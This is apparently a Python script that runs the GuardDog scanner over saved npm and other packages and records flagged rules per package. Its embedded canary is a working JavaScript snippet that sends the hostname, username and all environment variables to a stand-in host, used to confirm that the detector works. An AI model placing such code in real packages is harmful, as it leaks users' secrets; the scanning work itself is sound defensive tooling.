"""Run GuardDog over every kept package folder (D6-37); runs inside the GuardDog image.

build_dataset.py --keep copies each sample's files (the same files the scan
sees) to one folder per package. This script runs `guarddog <ecosystem> scan`
on each folder, in parallel, and writes one JSON line per package. A canary
with a known answer is scanned first, so a GuardDog that silently finds
nothing stops the run instead of producing clean-looking results.

Standard library only (the GuardDog image has Python 3.10).

docker run --rm --network none -v <kept volume>:/keep:ro -v <out>:/out -v <repo>:/repo:ro \\
  --entrypoint python3 ghcr.io/datadog/guarddog:3.2.0 /repo/mvp/10-local-entry/b_score/guarddog_pass.py \\
  --keep /keep --out /out/guarddog.jsonl
"""

import argparse
import json
import subprocess
import tempfile
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

CANARY = (
    'const os = require("os"); const https = require("https");\n'
    'const data = JSON.stringify({ h: os.hostname(), u: os.userInfo().username, e: process.env });\n'
    'const req = https.request({ hostname: "collector.example", path: "/x", method: "POST" }, () => {});\n'
    'req.write(data); req.end();\n')


def scan(path, ecosystem, timeout):
    try:
        done = subprocess.run(["guarddog", ecosystem, "scan", str(path), "--output-format=json"],
                              capture_output=True, timeout=timeout, check=False)
        output = json.loads(done.stdout.decode("utf-8", "replace") or "{}")
    except (OSError, subprocess.TimeoutExpired, ValueError) as error:
        return {"error": str(error)}
    if "results" not in output:
        return {"error": done.stderr.decode("utf-8", "replace")[-300:]}
    risk = output.get("risk_score") or {}
    return {"rules": sorted(r for r, hits in output["results"].items() if hits),
            "score": risk.get("score"), "label": risk.get("label", ""),
            "errors": sorted(output.get("errors") or {})}


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--keep", type=Path, required=True)
    parser.add_argument("--out", type=Path, required=True)
    parser.add_argument("--workers", type=int, default=8)
    parser.add_argument("--timeout", type=int, default=600)
    args = parser.parse_args()
    with tempfile.TemporaryDirectory() as folder:
        Path(folder, "index.js").write_text(CANARY, encoding="utf-8")
        Path(folder, "package.json").write_text('{"name": "canary", "version": "1.0.0"}', encoding="utf-8")
        canary = scan(Path(folder), "npm", args.timeout)
    if "threat-network-exfil-sysinfo" not in canary.get("rules", []):
        raise SystemExit(f"guarddog canary not detected: {canary}")
    done = set()
    if args.out.exists():
        done = {json.loads(line)["uid"] for line in args.out.read_text(encoding="utf-8").splitlines()}
    folders = sorted(p for p in args.keep.iterdir() if p.is_dir() and p.name not in done)
    print(f"{len(folders)} packages to scan ({len(done)} already done)", flush=True)

    def job(path):
        ecosystem = path.name.split("-", 1)[0]
        return {"uid": path.name, **scan(path, ecosystem, args.timeout)}

    with ThreadPoolExecutor(max_workers=args.workers) as pool, args.out.open("a", encoding="utf-8") as out:
        for n, result in enumerate(pool.map(job, folders), 1):
            out.write(json.dumps(result) + "\n")
            if n % 100 == 0:
                out.flush()
                print(f"  {n}/{len(folders)}", flush=True)


if __name__ == "__main__":
    main()
